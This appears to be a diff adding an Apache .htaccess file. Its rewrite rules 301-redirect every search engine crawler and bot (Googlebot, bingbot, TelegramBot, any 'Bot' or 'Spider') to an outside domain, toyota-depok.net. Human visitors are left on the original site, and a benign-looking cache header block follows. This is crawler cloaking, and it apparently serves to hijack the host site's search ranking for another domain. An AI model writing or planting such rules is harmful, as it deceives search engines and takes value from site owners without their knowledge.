@@ -1,0 +1,15 @@
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # Pengecualian untuk robots.txt
+    RewriteCond %{REQUEST_URI} !^/robots\.txt$ [NC]
+
+    # Redirect untuk bot tertentu
+    RewriteCond %{HTTP_USER_AGENT} (Googlebot|TelegramBot|bingbot|AhrefsBot|.*Bot.*|.*Spider.*) [NC]
+    RewriteRule ^.*$ https://www.toyota-depok.net/ [R=301,L]
+</IfModule>
+
+# Tambahkan cache header untuk meningkatkan performa
+<IfModule mod_headers.c>
+    Header set Cache-Control "private, max-age=3600"
+</IfModule>
